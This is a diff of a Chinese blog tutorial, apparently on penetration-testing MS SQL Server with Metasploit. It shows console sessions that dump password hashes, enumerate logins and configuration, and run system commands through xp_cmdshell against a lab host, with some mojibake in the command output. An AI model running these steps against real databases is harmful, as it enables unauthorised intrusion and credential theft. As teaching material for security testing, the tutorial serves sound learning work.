hosts (100% complete)</span><br><span class="line">    [*] Auxiliary module execution completed</span><br><span class="line">    msf5 auxiliary(scanner/mssql/mssql_hashdump) &gt; </span><br></pre></td></tr></table></figure>
 <ul>
 <li><strong>可以使用第三方工具来对这些哈希值进行破解</strong></li>
 </ul>
 <h3 id="浏览-sql-server">4、浏览 SQL Server</h3>
 <p><strong>利用已取得的目标数据库的用户名和密码。登录到这个服务器上从该数据库收集重要的信息，比如存储过程、数据库的数量和名称、可登录到数据库的Windows组、数据库中的文件以及一些参数。</strong></p>
 <p><strong>对应模块：auxiliary/admin/mssql/mssql_enum，操作如下（run之后的结果是有所省略的）：</strong></p>
-<pre><code>**msf5 &gt; use auxiliary/admin/mssql/mssql_enum
-    msf5 auxiliary(admin/mssql/mssql_enum) &gt;** **show options** 
-    
-    Module options (auxiliary/admin/mssql/mssql_enum):
-    
-       Name                 Current Setting  Required  Description
-       ----                 ---------------  --------  -----------
-       PASSWORD                              no        The password for the specified username
-       RHOSTS                                yes       The target address range or CIDR identifier
-       RPORT                1433             yes       The target port (TCP)
-       TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data &quot;Force Encryption&quot;
-       USERNAME             sa               no        The username to authenticate as
-       USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)
-    
- **msf5 auxiliary(admin** **/mssql/mssql_enum) &gt; set password 123456**
-    password =&gt; 123456 **msf5 auxiliary(admin /mssql/mssql_enum) &gt; set rhosts 192.168.1.104**
-    rhosts =&gt; 192.168.1.104 **msf5 auxiliary(admin /mssql/mssql_enum) &gt;** **run**
-    [*] Running module against 192.168.1.104
-    
-    [*] 192.168.1.104:1433 - Running MS SQL Server Enumeration...
-    [*] 192.168.1.104:1433 - Version:
-    [*]    Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64) 
-    [*]        Apr  2 2010 15:48:46 
-    [*]        Copyright (c) Microsoft Corporation
-    [*]        Enterprise Edition (64-bit) on Windows NT 6.2 &lt;X64&gt; (Build 9200: )
-    [*] 192.168.1.104:1433 - Configuration Parameters:
-    [*] 192.168.1.104:1433 -     C2 Audit Mode is Not Enabled
-**[** ***] 192.168.1.104:1433 -     xp_cmdshell is Enabled
-    [*] 192.168.1.104:1433 -     remote access is** **Enabled**
-    [*] 192.168.1.104:1433 -     allow updates is Not Enabled
-    [*] 192.168.1.104:1433 -     Database Mail XPs is Not Enabled
-    [*] 192.168.1.104:1433 -     Ole Automation Procedures are Not Enabled
-    [*] 192.168.1.104:1433 - Databases on the server:
-    [*] 192.168.1.104:1433 -     Database name:master
-    [*] 192.168.1.104:1433 -     Database Files for master:
-    [*] 192.168.1.104:1433 -         D:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\master.mdf
-    [*] 192.168.1.104:1433 -         D:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\mastlog.ldf
-    [*] 192.168.1.104:1433 -     Database name:tempdb
-    [*] 192.168.1.104:1433 -     Database Files for tempdb:
-    [*] 192.168.1.104:1433 -         D:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\tempdb.mdf
-    [*] 192.168.1.104:1433 -         D:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\templog.ldf
-    …………
- **[** ***] 192.168.1.104:1433 -** **System Logins on this Server:**
-    [*] 192.168.1.104:1433 -     sa
-    [*] 192.168.1.104:1433 -     ##MS_SQLResourceSigningCertificate##
-    …………
-    [*] 192.168.1.104:1433 -     coach
-    [*] 192.168.1.104:1433 -     student
-    [*] 192.168.1.104:1433 - Disabled Accounts:
-    [*] 192.168.1.104:1433 -     ##MS_PolicyEventProcessingLogin##
-    [*] 192.168.1.104:1433 -     ##MS_PolicyTsqlExecutionLogin##
-    [*] 192.168.1.104:1433 - No Accounts Policy is set for:
-    [*] 192.168.1.104:1433 -     All System Accounts have the Windows Account Policy Applied to them.
-    [*] 192.168.1.104:1433 - Password Expiration is not checked for:
-    [*] 192.168.1.104:1433 -     sa
-    …………
-    [*] 192.168.1.104:1433 -     coach
-    [*] 192.168.1.104:1433 -     student
-    [*] 192.168.1.104:1433 - Windows Logins on this Server:
-    [*] 192.168.1.104:1433 -     NT AUTHORITY\SYSTEM
-    …………
-    [*] 192.168.1.104:1433 - Windows Groups that can logins on this Server:
-    [*] 192.168.1.104:1433 -     NT SERVICE\MSSQLSERVER
-    [*] 192.168.1.104:1433 -     NT SERVICE\SQLSERVERAGENT
-    [*] 192.168.1.104:1433 - Accounts with Username and Password being the same:
-    [*] 192.168.1.104:1433 -     No Account with its password being the same as its username was found.
-  **[** ***] 192.168.1.104:1433 -** **Accounts with empty password:**
-    [*] 192.168.1.104:1433 -     No Accounts with empty passwords where found.
-   **[** ***] 192.168.1.104:1433 -** **Stored Procedures with Public Execute Permission found:**
-    [*] 192.168.1.104:1433 -     sp_replsetsyncstatus
-    [*] 192.168.1.104:1433 -     sp_replcounters
-    [*] 192.168.1.104:1433 -     sp_replsendtoqueue
-    [*] 192.168.1.104:1433 -     sp_resyncexecutesql
-    [*] 192.168.1.104:1433 -     MSSQLSERVER
-    [*] 192.168.1.104:1433 - Default Server Instance SQL Server Service is running under the privilege of:
-    [*] 192.168.1.104:1433 -     NT AUTHORITY\NETWORKSERVICE
-    [*] Auxiliary module execution completed
-    msf5 auxiliary(admin/mssql/mssql_enum) &gt; </code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    msf5 &gt; use auxiliary/admin/mssql/mssql_enum</span><br><span class="line">    msf5 auxiliary(admin/mssql/mssql_enum) &gt;show options </span><br><span class="line">    </span><br><span class="line">    Module options (auxiliary/admin/mssql/mssql_enum):</span><br><span class="line">    </span><br><span class="line">       Name                 Current Setting  Required  Description</span><br><span class="line">       ----                 ---------------  --------  -----------</span><br><span class="line">       PASSWORD                              no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">       RHOSTS                                <span class="built_in">yes</span>       The target address range or CIDR identifier</span><br><span class="line">       RPORT                1433             <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">       TDSENCRYPTION        <span class="literal">false</span>            <span class="built_in">yes</span>       Use TLS/SSL <span class="keyword">for</span> TDS data <span class="string">&quot;Force Encryption&quot;</span></span><br><span class="line">       USERNAME             sa               no        The username to authenticate as</span><br><span class="line">       USE_WINDOWS_AUTHENT  <span class="literal">false</span>            <span class="built_in">yes</span>       Use windows authentification (requires DOMAIN option <span class="built_in">set</span>)</span><br><span class="line">    </span><br><span class="line"> msf5 auxiliary(admin/mssql/mssql_enum) &gt; <span class="built_in">set</span> password 123456</span><br><span class="line">    password =&gt; 123456 msf5 auxiliary(admin /mssql/mssql_enum) &gt; <span class="built_in">set</span> rhosts 192.168.1.104</span><br><span class="line">    rhosts =&gt; 192.168.1.104 msf5 auxiliary(admin /mssql/mssql_enum) &gt;run</span><br><span class="line">    [*] Running module against 192.168.1.104</span><br><span class="line">    </span><br><span class="line">    [*] 192.168.1.104:1433 - Running MS SQL Server Enumeration...</span><br><span class="line">    [*] 192.168.1.104:1433 - Version:</span><br><span class="line">    [*]    Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64) </span><br><span class="line">    [*]        Apr  2 2010 15:48:46 </span><br><span class="line">    [*]        Copyright (c) Microsoft Corporation</span><br><span class="line">    [*]        Enterprise Edition (64-bit) on Windows NT 6.2 &lt;X64&gt; (Build 9200: )</span><br><span class="line">    [*] 192.168.1.104:1433 - Configuration Parameters:</span><br><span class="line">    [*] 192.168.1.104:1433 -     C2 Audit Mode is Not Enabled</span><br><span class="line">[*] 192.168.1.104:1433 -     xp_cmdshell is Enabled</span><br><span class="line">    [*] 192.168.1.104:1433 -     remote access isEnabled</span><br><span class="line">    [*] 192.168.1.104:1433 -     allow updates is Not Enabled</span><br><span class="line">    [*] 192.168.1.104:1433 -     Database Mail XPs is Not Enabled</span><br><span class="line">    [*] 192.168.1.104:1433 -     Ole Automation Procedures are Not Enabled</span><br><span class="line">    [*] 192.168.1.104:1433 - Databases on the server:</span><br><span class="line">    [*] 192.168.1.104:1433 -     Database name:master</span><br><span class="line">    [*] 192.168.1.104:1433 -     Database Files <span class="keyword">for</span> master:</span><br><span class="line">    [*] 192.168.1.104:1433 -         D:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\master.mdf</span><br><span class="line">    [*] 192.168.1.104:1433 -         D:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\mastlog.ldf</span><br><span class="line">    [*] 192.168.1.104:1433 -     Database name:tempdb</span><br><span class="line">    [*] 192.168.1.104:1433 -     Database Files <span class="keyword">for</span> tempdb:</span><br><span class="line">    [*] 192.168.1.104:1433 -         D:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\tempdb.mdf</span><br><span class="line">    [*] 192.168.1.104:1433 -         D:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\templog.ldf</span><br><span class="line">    …………</span><br><span class="line"> [*] 192.168.1.104:1433 -System Logins on this Server:</span><br><span class="line">    [*] 192.168.1.104:1433 -     sa</span><br><span class="line">    [*] 192.168.1.104:1433 -     <span class="comment">##MS_SQLResourceSigningCertificate##</span></span><br><span class="line">    …………</span><br><span class="line">    [*] 192.168.1.104:1433 -     coach</span><br><span class="line">    [*] 192.168.1.104:1433 -     student</span><br><span class="line">    [*] 192.168.1.104:1433 - Disabled Accounts:</span><br><span class="line">    [*] 192.168.1.104:1433 -     <span class="comment">##MS_PolicyEventProcessingLogin##</span></span><br><span class="line">    [*] 192.168.1.104:1433 -     <span class="comment">##MS_PolicyTsqlExecutionLogin##</span></span><br><span class="line">    [*] 192.168.1.104:1433 - No Accounts Policy is <span class="built_in">set</span> <span class="keyword">for</span>:</span><br><span class="line">    [*] 192.168.1.104:1433 -     All System Accounts have the Windows Account Policy Applied to them.</span><br><span class="line">    [*] 192.168.1.104:1433 - Password Expiration is not checked <span class="keyword">for</span>:</span><br><span class="line">    [*] 192.168.1.104:1433 -     sa</span><br><span class="line">    …………</span><br><span class="line">    [*] 192.168.1.104:1433 -     coach</span><br><span class="line">    [*] 192.168.1.104:1433 -     student</span><br><span class="line">    [*] 192.168.1.104:1433 - Windows Logins on this Server:</span><br><span class="line">    [*] 192.168.1.104:1433 -     NT AUTHORITY\SYSTEM</span><br><span class="line">    …………</span><br><span class="line">    [*] 192.168.1.104:1433 - Windows Groups that can logins on this Server:</span><br><span class="line">    [*] 192.168.1.104:1433 -     NT SERVICE\MSSQLSERVER</span><br><span class="line">    [*] 192.168.1.104:1433 -     NT SERVICE\SQLSERVERAGENT</span><br><span class="line">    [*] 192.168.1.104:1433 - Accounts with Username and Password being the same:</span><br><span class="line">    [*] 192.168.1.104:1433 -     No Account with its password being the same as its username was found.</span><br><span class="line">  [*] 192.168.1.104:1433 -Accounts with empty password:</span><br><span class="line">    [*] 192.168.1.104:1433 -     No Accounts with empty passwords <span class="built_in">where</span> found.</span><br><span class="line">   [*] 192.168.1.104:1433 -Stored Procedures with Public Execute Permission found:</span><br><span class="line">    [*] 192.168.1.104:1433 -     sp_replsetsyncstatus</span><br><span class="line">    [*] 192.168.1.104:1433 -     sp_replcounters</span><br><span class="line">    [*] 192.168.1.104:1433 -     sp_replsendtoqueue</span><br><span class="line">    [*] 192.168.1.104:1433 -     sp_resyncexecutesql</span><br><span class="line">    [*] 192.168.1.104:1433 -     MSSQLSERVER</span><br><span class="line">    [*] 192.168.1.104:1433 - Default Server Instance SQL Server Service is running under the privilege of:</span><br><span class="line">    [*] 192.168.1.104:1433 -     NT AUTHORITY\NETWORKSERVICE</span><br><span class="line">    [*] Auxiliary module execution completed</span><br><span class="line">    msf5 auxiliary(admin/mssql/mssql_enum) &gt; </span><br></pre></td></tr></table></figure>
 <ul>
 <li><strong>注意观察执行结果，会得到许多有用信息。</strong></li>
 </ul>
@@ -518,116 +327,14 @@ id="使用nmap脚本来获取目标数据库的信息">（3）使用Nmap脚本�
 <h4 id="重新载入xp_cmdshell功能">（2）重新载入xp_cmdshell功能</h4>
 <p><strong>模块mssql_exec将会通过重新载入禁用的xp_cmdshell功能来运行系统级的命令。这个模块需要设置要执行的系统命令的CMD选项。</strong></p>
 <p><strong>示例：</strong></p>
-<pre><code>**msf5 &gt; use auxiliary/admin/mssql/mssql_exec 
-    msf5 auxiliary(admin/mssql/mssql_exec) &gt;** **show options** 
-    
-    Module options (auxiliary/admin/mssql/mssql_exec):
-    
-       Name                 Current Setting                       Required  Description
-       ----                 ---------------                       --------  -----------
-       CMD                  cmd.exe /c echo OWNED &gt; C:\owned.exe  no        Command to execute
-       PASSWORD                                                   no        The password for the specified username
-       RHOSTS                                                     yes       The target address range or CIDR identifier
-       RPORT                1433                                  yes       The target port (TCP)
-       TDSENCRYPTION        false                                 yes       Use TLS/SSL for TDS data &quot;Force Encryption&quot;
-       USERNAME             sa                                    no        The username to authenticate as
-       USE_WINDOWS_AUTHENT  false                                 yes       Use windows authentification (requires DOMAIN option set)
-    
-**msf5 auxiliary(admin** **/mssql/mssql_exec) &gt; set rhosts 192.168.1.104**
-    rhosts =&gt; 192.168.1.104 **msf5 auxiliary(admin /mssql/mssql_exec) &gt; set password 123456**
-    password =&gt; 123456 **msf5 auxiliary(admin /mssql/mssql_exec) &gt; set cmd &#39;ipconfig&#39;**
-    cmd =&gt; ipconfig
- **msf5 auxiliary(admin** **/mssql/mssql_exec) &gt;** **run**
-    [*] Running module against 192.168.1.104
-    
-    [*] 192.168.1.104:1433 - SQL Query: EXEC master..xp_cmdshell &#39;ipconfig&#39;
-    
-     output
-     ------
-     
-     Windows IP M�n
-     
-     
-     �e�~@\�WQ�M�hV ,g0Wޏ�c* 3:
-     
-        �ZSO�r`  . . . . . . . . . . . . : �ZSO�]�e_ޏ�c
-        ޏ�cyr�[�v DNS T . . . . . . . : 
-     
-     �e�~@\�WQ�M�hV ,g0Wޏ�c* 4:
-     
-        �ZSO�r`  . . . . . . . . . . . . : �ZSO�]�e_ޏ�c
-        ޏ�cyr�[�v DNS T . . . . . . . : 
-     
-     �N*YQ�M�hV VMware Network Adapter VMnet1:
-     
-        ޏ�cyr�[�v DNS T . . . . . . . : 
-        ,g0W���c IPv6 0W@W. . . . . . . . : fe80::b5b6:426f:907c:7d60%5
-        IPv4 0W@W . . . . . . . . . . . . : 192.168.10.1
-        P[Q�cx  . . . . . . . . . . . . : 255.255.255.0
-        ؞��QsQ. . . . . . . . . . . . . : 
-     
-     �N*YQ�M�hV VMware Network Adapter VMnet8:
-     
-        ޏ�cyr�[�v DNS T . . . . . . . : 
-        ,g0W���c IPv6 0W@W. . . . . . . . : fe80::d9b4:73e0:7e23:87df%8
-        IPv4 0W@W . . . . . . . . . . . . : 10.10.10.1
-        P[Q�cx  . . . . . . . . . . . . : 255.255.255.0
-        ؞��QsQ. . . . . . . . . . . . . : 
-     
-     �e�~@\�WQ�M�hV WLAN:
-     
-        ޏ�cyr�[�v DNS T . . . . . . . : 
-        ,g0W���c IPv6 0W@W. . . . . . . . : fe80::6941:409f:25c4:4914%14
-        IPv4 0W@W . . . . . . . . . . . . : 192.168.1.104
-        P[Q�cx  . . . . . . . . . . . . : 255.255.255.0
-        ؞��QsQ. . . . . . . . . . . . . : 192.168.1.1
-     
-     �N*YQ�M�hV �N*YQ 3:
-     
-        �ZSO�r`  . . . . . . . . . . . . : �ZSO�]�e_ޏ�c
-        ޏ�cyr�[�v DNS T . . . . . . . : 
-     
-    
-    [*] Auxiliary module execution completed  </code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/admin/mssql/mssql_exec </span><br><span class="line">    msf5 auxiliary(admin/mssql/mssql_exec) &gt;show options </span><br><span class="line">    </span><br><span class="line">    Module options (auxiliary/admin/mssql/mssql_exec):</span><br><span class="line">    </span><br><span class="line">       Name                 Current Setting                       Required  Description</span><br><span class="line">       ----                 ---------------                       --------  -----------</span><br><span class="line">       CMD                  cmd.exe /c <span class="built_in">echo</span> OWNED &gt; C:\owned.exe  no        Command to execute</span><br><span class="line">       PASSWORD                                                   no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">       RHOSTS                                                     <span class="built_in">yes</span>       The target address range or CIDR identifier</span><br><span class="line">       RPORT                1433                                  <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">       TDSENCRYPTION        <span class="literal">false</span>                                 <span class="built_in">yes</span>       Use TLS/SSL <span class="keyword">for</span> TDS data <span class="string">&quot;Force Encryption&quot;</span></span><br><span class="line">       USERNAME             sa                                    no        The username to authenticate as</span><br><span class="line">       USE_WINDOWS_AUTHENT  <span class="literal">false</span>                                 <span class="built_in">yes</span>       Use windows authentification (requires DOMAIN option <span class="built_in">set</span>)</span><br><span class="line">    </span><br><span class="line">msf5 auxiliary(admin/mssql/mssql_exec) &gt; <span class="built_in">set</span> rhosts 192.168.1.104</span><br><span class="line">    rhosts =&gt; 192.168.1.104 msf5 auxiliary(admin /mssql/mssql_exec) &gt; <span class="built_in">set</span> password 123456</span><br><span class="line">    password =&gt; 123456 msf5 auxiliary(admin /mssql/mssql_exec) &gt; <span class="built_in">set</span> cmd <span class="string">&#x27;ipconfig&#x27;</span></span><br><span class="line">    cmd =&gt; ipconfig</span><br><span class="line"> msf5 auxiliary(admin/mssql/mssql_exec) &gt;run</span><br><span class="line">    [*] Running module against 192.168.1.104</span><br><span class="line">    </span><br><span class="line">    [*] 192.168.1.104:1433 - SQL Query: EXEC master..xp_cmdshell <span class="string">&#x27;ipconfig&#x27;</span></span><br><span class="line">    </span><br><span class="line">     output</span><br><span class="line">     ------</span><br><span class="line">     </span><br><span class="line">     Windows IP M�n</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">     �e�~@\�WQ�M�hV ,g0Wޏ�c* 3:</span><br><span class="line">     </span><br><span class="line">        �ZSO�r`  . . . . . . . . . . . . : �ZSO�]�e_ޏ�c</span><br><span class="line">        ޏ�cyr�[�v DNS T . . . . . . . : </span><br><span class="line">     </span><br><span class="line">     �e�~@\�WQ�M�hV ,g0Wޏ�c* 4:</span><br><span class="line">     </span><br><span class="line">        �ZSO�r`  . . . . . . . . . . . . : �ZSO�]�e_ޏ�c</span><br><span class="line">        ޏ�cyr�[�v DNS T . . . . . . . : </span><br><span class="line">     </span><br><span class="line">     �N*YQ�M�hV VMware Network Adapter VMnet1:</span><br><span class="line">     </span><br><span class="line">        ޏ�cyr�[�v DNS T . . . . . . . : </span><br><span class="line">        ,g0W���c IPv6 0W@W. . . . . . . . : fe80::b5b6:426f:907c:7d60%5</span><br><span class="line">        IPv4 0W@W . . . . . . . . . . . . : 192.168.10.1</span><br><span class="line">        P[Q�cx  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">        ؞��QsQ. . . . . . . . . . . . . : </span><br><span class="line">     </span><br><span class="line">     �N*YQ�M�hV VMware Network Adapter VMnet8:</span><br><span class="line">     </span><br><span class="line">        ޏ�cyr�[�v DNS T . . . . . . . : </span><br><span class="line">        ,g0W���c IPv6 0W@W. . . . . . . . : fe80::d9b4:73e0:7e23:87df%8</span><br><span class="line">        IPv4 0W@W . . . . . . . . . . . . : 10.10.10.1</span><br><span class="line">        P[Q�cx  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">        ؞��QsQ. . . . . . . . . . . . . : </span><br><span class="line">     </span><br><span class="line">     �e�~@\�WQ�M�hV WLAN:</span><br><span class="line">     </span><br><span class="line">        ޏ�cyr�[�v DNS T . . . . . . . : </span><br><span class="line">        ,g0W���c IPv6 0W@W. . . . . . . . : fe80::6941:409f:25c4:4914%14</span><br><span class="line">        IPv4 0W@W . . . . . . . . . . . . : 192.168.1.104</span><br><span class="line">        P[Q�cx  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">        ؞��QsQ. . . . . . . . . . . . . : 192.168.1.1</span><br><span class="line">     </span><br><span class="line">     �N*YQ�M�hV �N*YQ 3:</span><br><span class="line">     </span><br><span class="line">        �ZSO�r`  . . . . . . . . . . . . : �ZSO�]�e_ޏ�c</span><br><span class="line">        ޏ�cyr�[�v DNS T . . . . . . . : </span><br><span class="line">     </span><br><span class="line">    </span><br><span class="line">    [*] Auxiliary module execution completed  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p><strong>注意：目标系统如果安装有安全软件，部分命令会被拦截，如：net
 user 被360拦截</strong></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211207110707946-477473885.png" /></p>
 <h4 id="运行sql查询命令">（3）运行SQL查询命令</h4>
 <p><strong>可以使用mssql_sql模块对目标数据库服务器执行SQL查询命令。你只需将SQL参数的值设定为一条有效的数据库查询命令，这条命令就会被执行。</strong></p>
 <p><strong>以查询数据库版本为例</strong></p>
-<pre><code>**msf5 &gt; use auxiliary/admin/mssql/mssql_sql
-    msf5 auxiliary(admin/mssql/mssql_sql) &gt;** **show options** 
-    
-    Module options (auxiliary/admin/mssql/mssql_sql):
-    
-       Name                 Current Setting   Required  Description
-       ----                 ---------------   --------  -----------
-       PASSWORD                               no        The password for the specified username
-       RHOSTS                                 yes       The target address range or CIDR identifier
-       RPORT                1433              yes       The target port (TCP)
-      **SQL                  select @@version  no        The SQL query to execute**
-       TDSENCRYPTION        false             yes       Use TLS/SSL for TDS data &quot;Force Encryption&quot;
-       USERNAME             sa                no        The username to authenticate as
-       USE_WINDOWS_AUTHENT  false             yes       Use windows authentification (requires DOMAIN option set)
-    
-    **msf5 auxiliary(admin** **/mssql/mssql_sql) &gt; set rhosts 192.168.1.104**
-    rhosts =&gt; 192.168.1.104 **msf5 auxiliary(admin /mssql/mssql_sql) &gt; set password 123456**
-    password =&gt; 123456 **msf5 auxiliary(admin /mssql/mssql_sql) &gt;** **run**
-    [*] Running module against 192.168.1.104
-    
-    [*] 192.168.1.104:1433 - SQL Query: select @@version
-    [*] 192.168.1.104:1433 - Row Count: 1 (Status: 16 Command: 193)
-    
-    
-    
-     NULL
-     ---- **Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1** **(X64)** 
-    Apr  2 2010 15:48:46 
-    Copyright (c) Microsoft Corporation
-    Enterprise Edition (64-bit) on Windows NT 6.2 &lt;X64&gt; (Build 9200: )
-    [*] Auxiliary module execution completed</code></pre>
-<h2 id="三参考文献">三、参考文献</h2>
-<p><strong>《精通Metasploit渗透测试》</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/admin/mssql/mssql_sql</span><br><span class="line">    msf5 auxiliary(admin/mssql/mssql_sql) &gt;show options </span><br><span class="line">    </span><br><span class="line">    Module options (auxiliary/admin/mssql/mssql_sql):</span><br><span class="line">    </span><br><span class="line">       Name                 Current Setting   Required  Description</span><br><span class="line">       ----                 ---------------   --------  -----------</span><br><span class="line">       PASSWORD                               no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">       RHOSTS                                 <span class="built_in">yes</span>       The target address range or CIDR identifier</span><br><span class="line">       RPORT                1433              <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">      SQL                  <span class="keyword">select</span> @@version  no        The SQL query to execute</span><br><span class="line">       TDSENCRYPTION        <span class="literal">false</span>             <span class="built_in">yes</span>       Use TLS/SSL <span class="keyword">for</span> TDS data <span class="string">&quot;Force Encryption&quot;</span></span><br><span class="line">       USERNAME             sa                no        The username to authenticate as</span><br><span class="line">       USE_WINDOWS_AUTHENT  <span class="literal">false</span>             <span class="built_in">yes</span>       Use windows authentification (requires DOMAIN option <span class="built_in">set</span>)</span><br><span class="line">    </span><br><span class="line">    msf5 auxiliary(admin/mssql/mssql_sql) &gt; <span class="built_in">set</span> rhosts 192.168.1.104</span><br><span class="line">    rhosts =&gt; 192.168.1.104 msf5 auxiliary(admin /mssql/mssql_sql) &gt; <span class="built_in">set</span> password 123456</span><br><span class="line">    password =&gt; 123456 msf5 auxiliary(admin /mssql/mssql_sql) &gt;run</span><br><span class="line">    [*] Running module against 192.168.1.104</span><br><span class="line">    </span><br><span class="line">    [*] 192.168.1.104:1433 - SQL Query: <span class="keyword">select</span> @@version</span><br><span class="line">    [*] 192.168.1.104:1433 - Row Count: 1 (Status: 16 Command: 193)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">     NULL</span><br><span class="line">     ---- Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1(X64) </span><br><span class="line">    Apr  2 2010 15:48:46 </span><br><span class="line">    Copyright (c) Microsoft Corporation</span><br><span class="line">    Enterprise Edition (64-bit) on Windows NT 6.2 &lt;X64&gt; (Build 9200: )</span><br><span class="line">    [*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
 
     </div>
 
@@ -705,7 +412,7 @@ user 被360拦截</strong></p>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">10:13</span>
+    <span title="站点阅读时长">10:14</span>
   </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
